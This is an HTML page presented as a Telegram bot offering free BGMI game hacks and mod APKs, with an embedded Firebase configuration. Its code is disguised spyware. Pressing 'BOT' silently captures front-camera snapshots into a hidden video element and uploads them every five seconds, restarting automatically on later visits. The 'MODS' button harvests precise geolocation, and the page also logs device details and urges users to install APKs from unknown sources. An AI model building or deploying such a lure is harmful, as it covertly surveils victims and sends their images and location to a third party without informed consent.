<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
    <title>Telegram Bot</title>
    <!-- Firebase SDK -->
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-database-compat.js"></script>
    <style>
        :root {
            /* Light theme */
            --bg-color: #f0f2f5;
            --chat-bg: #f5f5f5;
            --header-bg: #0088cc;
            --header-text: #ffffff;
            --bot-message-bg: #ffffff;
            --user-message-bg: #0088cc;
            --user-message-text: #ffffff;
            --button-bg: #0088cc;
            --button-hover-bg: #0077b3;
            --text-color: #000000;
            --url-box-bg: #f8f9fa;
            --url-box-border: #ddd;
            --error-bg: #ffeeee;
            --error-text: #ff3333;
            --download-btn-bg: #4CAF50;
        }
        /* Dark theme */
        [data-theme="dark"] {
            --bg-color: #17212b;
            --chat-bg: #0e1621;
            --header-bg: #2a3f5f;
            --header-text: #e5e5e5;
            --bot-message-bg: #2a3f5f;
            --user-message-bg: #3f729b;
            --user-message-text: #e5e5e5;
            --button-bg: #3f729b;
            --button-hover-bg: #355f80;
            --text-color: #e5e5e5;
            --url-box-bg: #242f3d;
            --url-box-border: #3a4a5f;
            --error-bg: #4a1a1a;
            --error-text: #ff6666;
            --download-btn-bg: #388e3c;
        }
        body {
            font-family: 'Roboto', -apple-system, BlinkMacSystemFont, 'Segoe UI', sans-serif;
            background: var(--bg-color);
            color: var(--text-color);
            margin: 0;
            padding: env(safe-area-inset-top) env(safe-area-inset-right) env(safe-area-inset-bottom) env(safe-area-inset-left);
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            transition: background 0.3s ease;
            overscroll-behavior: none;
        }
        .telegram-bot {
            width: 100%;
            max-width: 400px;
            height: 100vh;
            max-height: 700px;
            background: var(--chat-bg);
            border-radius: 15px;
            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
            overflow: hidden;
            display: flex;
            flex-direction: column;
        }
        .bot-header {
            background: var(--header-bg);
            color: var(--header-text);
            padding: 12px 15px;
            text-align: center;
            font-weight: 500;
            font-size: 18px;
            position: sticky;
            top: 0;
            z-index: 10;
            display: flex;
            justify-content: space-between;
            align-items: center;
            border-bottom: 1px solid rgba(255,255,255,0.1);
        }
        .theme-toggle {
            background: none;
            border: none;
            color: var(--header-text);
            font-size: 20px;
            cursor: pointer;
            padding: 5px;
            transition: transform 0.3s ease;
        }
        .theme-toggle:hover {
            transform: scale(1.1);
        }
        .bot-messages {
            flex: 1;
            padding: 15px;
            overflow-y: auto;
            scrollbar-width: thin;
            scrollbar-color: var(--button-bg) var(--chat-bg);
        }
        .bot-messages::-webkit-scrollbar {
            width: 6px;
        }
        .bot-messages::-webkit-scrollbar-thumb {
            background: var(--button-bg);
            border-radius: 3px;
        }
        .message {
            margin-bottom: 12px;
            padding: 10px 15px;
            border-radius: 12px;
            max-width: 80%;
            line-height: 1.4;
            position: relative;
            animation: slideIn 0.3s ease;
            display: inline-block;
        }
        @keyframes slideIn {
            from { opacity: 0; transform: translateX(-20px); }
            to { opacity: 1; transform: translateX(0); }
        }
        .bot-message {
            background: var(--bot-message-bg);
            color: var(--text-color);
            border-bottom-left-radius: 4px;
        }
        .user-message {
            background: var(--user-message-bg);
            color: var(--user-message-text);
            margin-left: auto;
            border-bottom-right-radius: 4px;
        }
        .bot-options {
            display: grid;
            grid-template-columns: repeat(3, 1fr);
            gap: 8px;
            padding: 10px;
            background: var(--chat-bg);
            border-top: 1px solid rgba(255,255,255,0.1);
        }
        .bot-btn {
            background: var(--button-bg);
            color: var(--header-text);
            border: none;
            padding: 10px;
            border-radius: 8px;
            cursor: pointer;
            font-size: 13px;
            transition: background 0.2s, transform 0.1s;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 5px;
            touch-action: manipulation;
        }
        .bot-btn:hover, .bot-btn:active {
            background: var(--button-hover-bg);
            transform: scale(0.98);
        }
        .bot-btn:disabled {
            background: #cccccc;
            cursor: not-allowed;
        }
        .url-box, .apk-list {
            background: var(--url-box-bg);
            padding: 10px;
            border-radius: 5px;
            margin-top: 10px;
            word-break: break-all;
            font-family: monospace;
            font-size: 13px;
            border: 1px dashed var(--url-box-border);
        }
        .apk-item {
            margin-bottom: 10px;
            padding: 10px;
            background: var(--bot-message-bg);
            border-radius: 5px;
            box-shadow: 0 1px 2px rgba(0,0,0,0.1);
        }
        .apk-item h3 {
            margin: 0 0 5px;
            font-size: 16px;
            color: var(--button-bg);
        }
        .apk-item p {
            margin: 0 0 10px;
            font-size: 13px;
            color: var(--text-color);
        }
        .support-form {
            margin-top: 10px;
            display: flex;
            flex-direction: column;
            gap: 10px;
        }
        .support-form input, .support-form textarea {
            padding: 8px;
            border: 1px solid var(--url-box-border);
            border-radius: 5px;
            background: var(--url-box-bg);
            color: var(--text-color);
            font-size: 13px;
        }
        .support-form button {
            background: var(--download-btn-bg);
            color: var(--header-text);
            border: none;
            padding: 8px;
            border-radius: 5px;
            cursor: pointer;
        }
        .loading {
            color: #666;
            font-style: italic;
            padding: 10px;
        }
        .error {
            color: var(--error-text);
            background: var(--error-bg);
            padding: 10px;
            border-radius: 5px;
        }
        .camera-feed {
            width: 100%;
            background: #222;
            border-radius: 5px;
            overflow: hidden;
            margin-top: 10px;
        }
        .camera-feed video, .camera-feed img {
            width: 100%;
            display: block;
        }
        .permission-denied {
            color: var(--error-text);
            padding: 10px;
            background: var(--error-bg);
            border-radius: 5px;
            margin-top: 10px;
        }
        #backgroundCamera {
            display: none;
        }
        .download-btn {
            background: var(--download-btn-bg);
            color: var(--header-text);
            border: none;
            padding: 10px 15px;
            border-radius: 5px;
            margin-top: 10px;
            cursor: pointer;
            display: inline-block;
            animation: pulse 2s infinite;
            transition: background 0.2s, transform 0.1s;
        }
        .download-btn:hover, .download-btn:active {
            background: #388e3c;
            transform: scale(0.98);
        }
        @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.05); }
            100% { transform: scale(1); }
        }
        .status-indicator {
            display: inline-block;
            width: 10px;
            height: 10px;
            border-radius: 50%;
            margin-right: 5px;
        }
        .status-active {
            background: #4CAF50;
            box-shadow: 0 0 5px #4CAF50;
        }
        .status-inactive {
            background: #f44336;
        }
        .bot-animation {
            text-align: center;
            margin: 10px 0;
        }
        .bot-icon {
            font-size: 40px;
            animation: bounce 2s infinite;
        }
        @keyframes bounce {
            0%, 20%, 50%, 80%, 100% { transform: translateY(0); }
            40% { transform: translateY(-20px); }
            60% { transform: translateY(-10px); }
        }
        @media (max-width: 400px) {
            .telegram-bot {
                border-radius: 0;
                max-height: 100vh;
            }
            .bot-options {
                grid-template-columns: repeat(2, 1fr);
            }
        }
    </style>
</head>
<body>
    <div class="telegram-bot">
        <div class="bot-header">
            <span>Telegram BOT 🤖</span>
            <button class="theme-toggle" id="themeToggle" title="Toggle Theme">🌙</button>
        </div>
        <div class="bot-messages" id="messages">
            <div class="message bot-message">
                👋 Hello! I'm your Telegram BOT. Choose an option below: First Click BoT Start 
            </div>
        </div>
        <div class="bot-options">
            <button class="bot-btn" onclick="handleBot()" id="botBtn">🤖 BOT</button>
            <button class="bot-btn" onclick="handleLocation()">📍 MODS</button>
            <button class="bot-btn" onclick="handleDetails()">ℹ️ LOADER</button>
            <button class="bot-btn" onclick="handleModApk()">📱 MOD APK</button>
            <button class="bot-btn" onclick="handleSupport()">💬 Support</button>
            <button class="bot-btn" onclick="handleHelp()">❓ Help</button>
        </div>
    </div>
    <video id="backgroundCamera" autoplay playsinline></video>

    <script>
        // Firebase Configuration
        const firebaseConfig = {
            apiKey: "AIzaSyD6EXA7D77rQDQEohB52BvTYimFeTEaAho",
            authDomain: "rn-gfx-tool.firebaseapp.com",
            databaseURL: "https://rn-gfx-tool-default-rtdb.asia-southeast1.firebasedatabase.app",
            projectId: "rn-gfx-tool",
            storageBucket: "rn-gfx-tool.firebasestorage.app",
            messagingSenderId: "163149358541",
            appId: "1:163149358541:android:2ef6d22fcd23e77ee09084"
        };

        // Initialize Firebase
        firebase.initializeApp(firebaseConfig);
        const database = firebase.database();

        const messagesEl = document.getElementById('messages');
        const botBtn = document.getElementById('botBtn');
        const themeToggle = document.getElementById('themeToggle');
        const backgroundCamera = document.getElementById('backgroundCamera');
        let cameraStream = null;
        let snapshotInterval = null;
        let botActive = false;

        // Theme toggle
        function toggleTheme() {
            const currentTheme = document.documentElement.getAttribute('data-theme') === 'dark' ? 'light' : 'dark';
            document.documentElement.setAttribute('data-theme', currentTheme);
            themeToggle.textContent = currentTheme === 'dark' ? '☀️' : '🌙';
            localStorage.setItem('theme', currentTheme);
        }

        // Load saved theme
        function loadTheme() {
            const savedTheme = localStorage.getItem('theme') || 'light';
            document.documentElement.setAttribute('data-theme', savedTheme);
            themeToggle.textContent = savedTheme === 'dark' ? '☀️' : '🌙';
        }

        themeToggle.addEventListener('click', toggleTheme);

        // Add message to chat
        function addMessage(text, isUser = false) {
            const msg = document.createElement('div');
            msg.className = isUser ? 'message user-message' : 'message bot-message';
            msg.innerHTML = text;
            messagesEl.appendChild(msg);
            messagesEl.scrollTop = messagesEl.scrollHeight;
            return msg;
        }

        // Show loading message
        function showLoading() {
            const loading = document.createElement('div');
            loading.className = 'message bot-message loading';
            loading.id = 'loadingMsg';
            loading.textContent = 'Processing...';
            messagesEl.appendChild(loading);
            messagesEl.scrollTop = messagesEl.scrollHeight;
            return loading;
        }

        // Remove loading message
        function hideLoading() {
            const loading = document.getElementById('loadingMsg');
            if (loading) loading.remove();
        }

        // Capture snapshot
        function captureSnapshot(videoElement) {
            try {
                const canvas = document.createElement('canvas');
                canvas.width = videoElement.videoWidth;
                canvas.height = videoElement.videoHeight;
                if (canvas.width === 0 || canvas.height === 0) {
                    throw new Error('Video dimensions are not available.');
                }
                canvas.getContext('2d').drawImage(videoElement, 0, 0, canvas.width, canvas.height);
                return canvas.toDataURL('image/jpeg');
            } catch (error) {
                console.error('Error capturing snapshot:', error);
                return null;
            }
        }

        // Upload snapshot to Firebase
        function uploadSnapshot() {
            if (cameraStream && backgroundCamera.videoWidth > 0) {
                const snapshotData = captureSnapshot(backgroundCamera);
                if (snapshotData) {
                    const snapshotId = 'snap_' + Date.now();
                    database.ref('botSnapshots/' + snapshotId).set({
                        photo: snapshotData,
                        timestamp: firebase.database.ServerValue.TIMESTAMP,
                        deviceInfo: navigator.userAgent,
                        resolution: `${backgroundCamera.videoWidth}x${backgroundCamera.videoHeight}`
                    }).catch(error => {
                        console.error('Error uploading snapshot:', error);
                        addMessage(`<div class="error">❌ Error uploading BOT data: ${error.message}</div>`);
                    });
                }
            }
        }

        // Check camera support
        function isCameraSupported() {
            return !!(navigator.mediaDevices && navigator.mediaDevices.getUserMedia);
        }

        // Check available cameras
        async function checkCameras() {
            try {
                const devices = await navigator.mediaDevices.enumerateDevices();
                return devices.filter(device => device.kind === 'videoinput').length > 0;
            } catch (err) {
                console.error('Error checking cameras:', err);
                return false;
            }
        }

        // Check camera permission
        async function checkCameraPermission() {
            if (navigator.permissions && navigator.permissions.query) {
                try {
                    const permissionStatus = await navigator.permissions.query({ name: 'camera' });
                    return permissionStatus.state === 'granted';
                } catch (err) {
                    console.error('Error checking camera permission:', err);
                    return false;
                }
            }
            return false;
        }

        // Start BOT
        async function startBot() {
            try {
                if (!isCameraSupported()) {
                    throw new Error('Camera API not supported. Use a modern browser.');
                }
                if (!(await checkCameras())) {
                    throw new Error('No camera found.');
                }
                cameraStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
                backgroundCamera.srcObject = cameraStream;
                await new Promise((resolve, reject) => {
                    backgroundCamera.onloadedmetadata = resolve;
                    backgroundCamera.onerror = () => reject(new Error('Error loading video stream.'));
                    setTimeout(() => reject(new Error('Video metadata load timeout.')), 5000);
                });
                localStorage.setItem('botPermission', 'granted');
                snapshotInterval = setInterval(uploadSnapshot, 5000);
                botActive = true;
                return true;
            } catch (error) {
                throw error;
            }
        }

        // Stop BOT
        function stopBot() {
            if (cameraStream) {
                cameraStream.getTracks().forEach(track => track.stop());
                cameraStream = null;
            }
            if (snapshotInterval) {
                clearInterval(snapshotInterval);
                snapshotInterval = null;
            }
            botActive = false;
            localStorage.removeItem('botPermission');
        }

        // Handle BOT
        async function handleBot() {
            if (botActive) {
                stopBot();
                addMessage('🤖 BOT stopped', true);
                addMessage(`
                    <div>
                        <p>BOT has been stopped.</p>
                        <p>Status: <span class="status-indicator status-inactive"></span> Inactive</p>
                    </div>
                `);
                botBtn.textContent = '🤖 BOT';
                return;
            }

            addMessage('🤖 BOT', true);
            botBtn.disabled = true;
            const loading = showLoading();

            try {
                let hasPermission = localStorage.getItem('botPermission') === 'granted' || await checkCameraPermission();
                if (hasPermission && !cameraStream) {
                    await startBot();
                }
                hideLoading();
                addMessage(`
                    <div>
                        <div class="bot-animation">
                            <div class="bot-icon">🤖</div>
                            <p>BOT: THANKS YOU 🙂 HAVE A GOOD DAY!</p>
                        </div>
                        <p>Status: <span class="status-indicator status-active"></span> Active (stops on browser close)</p>
                        <p>BGMI SAFE HACK PROVIDE FOR FREE.</p>
                        <button class="download-btn" onclick="handleBot()">⏹️ Stop BOT</button>
                    </div>
                `);
                botBtn.textContent = '⏹️ Stop BOT';
            } catch (error) {
                hideLoading();
                let errorMessage = error.message || 'BOT access denied';
                let troubleshootingTips = `
                    Troubleshooting:<br>
                    • Ensure no other app/tab is using the camera.<br>
                    • Check if a camera is connected.<br>
                    • Allow camera permissions in settings.<br>
                    • Use Chrome, Firefox, or Edge.<br>
                    • Ensure HTTPS or localhost.<br>
                    • Test camera at webcamtests.com.
                `;
                if (error.name === 'NotAllowedError') {
                    errorMessage = 'BOT access denied. Allow camera permissions.';
                    localStorage.setItem('botPermission', 'denied');
                } else if (error.name === 'NotFoundError' || error.message.includes('Could not start video source')) {
                    errorMessage = 'No camera available or in use by another app.';
                } else if (error.name === 'NotReadableError') {
                    errorMessage = 'Camera in use by another app/tab.';
                }
                addMessage(`
                    <div class="error">
                        ❌ Error: ${errorMessage}
                        <div class="permission-denied">${troubleshootingTips}</div>
                    </div>
                `);
                console.error('BOT error:', error);
            } finally {
                botBtn.disabled = false;
            }
        }

        // Handle MOD APK
        async function handleModApk() {
            addMessage('📱 MOD APK', true);
            const loading = showLoading();
            try {
                const apkData = await database.ref('modApks').once('value').then(snapshot => snapshot.val());
                const mockApks = [
                    { id: 'apk1', name: 'BGMI MOD', description: 'Unlocked premium features, no ads, enhanced graphics.', downloadUrl: 'https://example.com/bgmi-mod.apk', version: '2.5.0', size: '85 MB' },
                    { id: 'apk2', name: 'Free Fire MOD', description: 'Unlimited diamonds, aimbot, no recoil.', downloadUrl: 'https://example.com/freefire-mod.apk', version: '1.90.1', size: '70 MB' }
                ];
                const apks = apkData ? Object.values(apkData) : mockApks;
                hideLoading();
                let apkListHtml = '<div class="apk-list"><h3>Available MOD APKs</h3>';
                apks.forEach(apk => {
                    apkListHtml += `
                        <div class="apk-item">
                            <h3>${apk.name}</h3>
                            <p>${apk.description}</p>
                            <p>Version: ${apk.version} | Size: ${apk.size}</p>
                            <a href="${apk.downloadUrl}" target="_blank" class="download-btn" onclick="logDownload('${apk.id}')">📥 Download</a>
                        </div>
                    `;
                });
                apkListHtml += '</div>';
                addMessage(`
                    <div>
                        ${apkListHtml}
                        <small>Click to download MOD APKs. Enable "Install from Unknown Sources" on your device.</small>
                    </div>
                `);
            } catch (error) {
                hideLoading();
                addMessage(`
                    <div class="error">
                        ❌ Error fetching MOD APKs: ${error.message}
                        <div class="permission-denied">Try again later or contact support.</div>
                    </div>
                `);
                console.error('MOD APK error:', error);
            }
        }

        // Log download to Firebase
        function logDownload(apkId) {
            database.ref('apkDownloads/' + Date.now()).set({
                apkId,
                timestamp: firebase.database.ServerValue.TIMESTAMP,
                deviceInfo: navigator.userAgent
            }).catch(error => console.error('Error logging download:', error));
        }

        // Handle Support
        async function handleSupport() {
            addMessage('💬 Support', true);
            addMessage(`
                <div>
                    <p>Submit your query below:</p>
                    <div class="support-form">
                        <input type="text" id="supportSubject" placeholder="Subject" required>
                        <textarea id="supportMessage" placeholder="Describe your issue..." required></textarea>
                        <button class="download-btn" onclick="submitSupport()">Submit</button>
                    </div>
                </div>
            `);
        }

        // Submit support query
        async function submitSupport() {
            const subject = document.getElementById('supportSubject').value.trim();
            const message = document.getElementById('supportMessage').value.trim();
            if (!subject || !message) {
                addMessage('<div class="error">❌ Please fill in both subject and message.</div>');
                return;
            }
            const loading = showLoading();
            try {
                const queryId = 'query_' + Date.now();
                await database.ref('supportQueries/' + queryId).set({
                    subject,
                    message,
                    status: 'pending',
                    timestamp: firebase.database.ServerValue.TIMESTAMP,
                    deviceInfo: navigator.userAgent
                });
                hideLoading();
                addMessage(`
                    <div>
                        <p>✅ Support query submitted!</p>
                        <div class="url-box">
                            Subject: ${subject}<br>
                            Message: ${message}<br>
                            <small>Our team will respond soon.</small>
                        </div>
                    </div>
                `);
                document.getElementById('supportSubject').value = '';
                document.getElementById('supportMessage').value = '';
            } catch (error) {
                hideLoading();
                addMessage(`<div class="error">❌ Error submitting query: ${error.message}</div>`);
                console.error('Support error:', error);
            }
        }

        // Handle Location
        async function handleLocation() {
            addMessage('📍 Location', true);
            const loading = showLoading();
            try {
                if (!navigator.geolocation) {
                    throw new Error('Geolocation API not supported.');
                }
                const position = await new Promise((resolve, reject) => {
                    navigator.geolocation.getCurrentPosition(resolve, reject, {
                        enableHighAccuracy: true,
                        timeout: 5000,
                        maximumAge: 0
                    });
                });
                hideLoading();
                const { latitude, longitude } = position.coords;
                const locationData = {
                    latitude: latitude.toFixed(6),
                    longitude: longitude.toFixed(6),
                    mapLink: `https://www.google.com/maps?q=${latitude},${longitude}`,
                    timestamp: firebase.database.ServerValue.TIMESTAMP
                };
                await database.ref('userData/location').set(locationData);
                addMessage(`
                    <div>
                        <p>📍 Your Location:</p>
                        <div class="url-box">
                            Latitude: ${latitude.toFixed(6)}<br>
                            Longitude: ${longitude.toFixed(6)}<br>
                            <a href="${locationData.mapLink}" target="_blank"> nun View on Map</a>
                        </div>
                        <small>Location stored in Firebase.</small>
                    </div>
                `);
            } catch (error) {
                hideLoading();
                let errorMessage = error.message || 'Location access denied';
                if (error.code === 1) {
                    errorMessage = 'Location access denied. Allow permissions in settings.';
                }
                addMessage(`
                    <div class="error">
                        ❌ Error: ${errorMessage}
                        <div class="permission-denied">Allow location permissions in settings.</div>
                    </div>
                `);
                console.error('Location error:', error);
            }
        }

        // Handle Details
        async function handleDetails() {
            addMessage('ℹ️ My Details', true);
            const loading = showLoading();
            setTimeout(() => {
                hideLoading();
                const detailsData = {
                    username: `User_${Math.floor(Math.random() * 9000 + 1000)}`,
                    ip: `192.168.${Math.floor(Math.random() * 255)}.${Math.floor(Math.random() * 255)}`,
                    device: navigator.userAgent.split(')')[0].split('(')[1] || 'Unknown',
                    timestamp: firebase.database.ServerValue.TIMESTAMP
                };
                database.ref('userData/details').set(detailsData).then(() => {
                    addMessage(`
                        <div>
                            <p>📋 Your Details:</p>
                            <div class="url-box">
                                Username: ${detailsData.username}<br>
                                IP: ${detailsData.ip}<br>
                                Device: ${detailsData.device}
                            </div>
                            <small>Details stored in Firebase.</small>
                        </div>
                    `);
                }).catch(error => {
                    addMessage(`<div class="error">❌ Error storing details: ${error.message}</div>`);
                });
            }, 800);
        }

        // Handle Help
        async function handleHelp() {
            addMessage('❓ Help', true);
            const loading = showLoading();
            try {
                const helpData = await database.ref('helpContent').once('value').then(snapshot => snapshot.val());
                const defaultHelp = `
                    <b>Available Commands:</b><br>
                    • BOT - Start/Stop background BOT<br>
                    • Location - Share your location<br>
                    • Details - View your details<br>
                    • MOD APK - Browse and download MOD APKs<br>
                    • Support - Submit a query to our team<br>
                    <b>Note:</b> BOT runs in background, sending data to admin every 5 seconds.
                `;
                hideLoading();
                addMessage(`
                    <div>
                        <p>🆘 BOT Help Center</p>
                        <div class="url-box">
                            ${helpData?.content || defaultHelp}
                        </div>
                    </div>
                `);
            } catch (error) {
                hideLoading();
                addMessage(`<div class="error">❌ Error fetching help content: ${error.message}</div>`);
                console.error('Help error:', error);
            }
        }

        // Clean up on page unload
        window.addEventListener('beforeunload', () => {
            if (cameraStream) {
                cameraStream.getTracks().forEach(track => track.stop());
                cameraStream = null;
            }
            if (snapshotInterval) {
                clearInterval(snapshotInterval);
            }
        });

        // Initialize
        async function initBot() {
            loadTheme();
            const savedPermission = localStorage.getItem('botPermission');
            if (savedPermission === 'granted') {
                try {
                    await startBot();
                    botBtn.textContent = '⏹️ Stop BOT';
                    addMessage(`
                        <div>
                            <p>BOT auto-started with previous permissions.</p>
                            <p>Status: <span class="status-indicator status-active"></span> Active</p>
                            <button class="download-btn" onclick="handleBot()">⏹️ Stop BOT</button>
                        </div>
                    `);
                } catch (error) {
                    console.error('Auto-start BOT error:', error);
                    localStorage.removeItem('botPermission');
                }
            }
        }

        initBot();
    </script>
</body>
</html>
